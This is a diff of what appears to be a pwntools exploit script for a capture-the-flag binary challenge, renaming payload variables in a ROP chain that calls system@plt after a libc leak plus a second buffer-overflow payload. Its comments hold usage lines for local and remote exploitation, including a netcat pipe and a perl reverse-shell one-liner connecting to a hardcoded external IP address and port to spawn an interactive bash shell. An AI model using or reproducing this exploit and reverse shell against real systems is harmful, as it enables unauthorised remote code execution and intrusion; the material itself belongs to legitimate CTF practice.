@@ -44,19 +44,19 @@ libc_base = menu2() << 8*4
 r.info(f"Libc (known): {hex(libc_base)}")
 
 
-payload = cyclic(120)
+payload1 = cyclic(120)
 # system("ed bytes?")
-payload += p64(pop_rdi_ret) + p64(0x00400eb2)
-payload += p64(0x400886) # system@plt
-payload += p64(elf.sym.exit)
+payload1 += p64(pop_rdi_ret) + p64(0x00400eb2)
+payload1 += p64(0x400886) # system@plt
+payload1 += p64(elf.sym.exit)
 
-total = b"1\n" + payload + b"\n"
 #menu1(payload)
+total = b"1\n" + payload1 + b"\n"
 
-payload = b"A"*92 + b"\x77" + b"\x00"*4
+payload3 = b"A"*92 + b"\x77" + b"\x00"*4
 
-total += b"3\n" + payload + b"\n"
 #menu3(payload)
+total += b"3\n" + payload3 + b"\n"
 
 #r.interactive()
 
@@ -66,7 +66,6 @@ open("payload","wb").write(total)
 # Local
 # (cat payload; echo "\!/bin/sh\nexec 1>/dev/tty && exec 2>/dev/tty"; cat flag*) | ./leakme_patched
 
-# Remote (reverse shell with perl and bore)
-# https://github.com/ekzhang/bore
-# (cat /tmp/paypay; cat) | nc 0 9046
+# Remote (reverse shell with perl and bore) https://github.com/ekzhang/bore
+# (cat /tmp/payload; cat) | nc 0 9046
 # !perl -e 'use Socket;$i="159.223.171.199";$p=9137;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
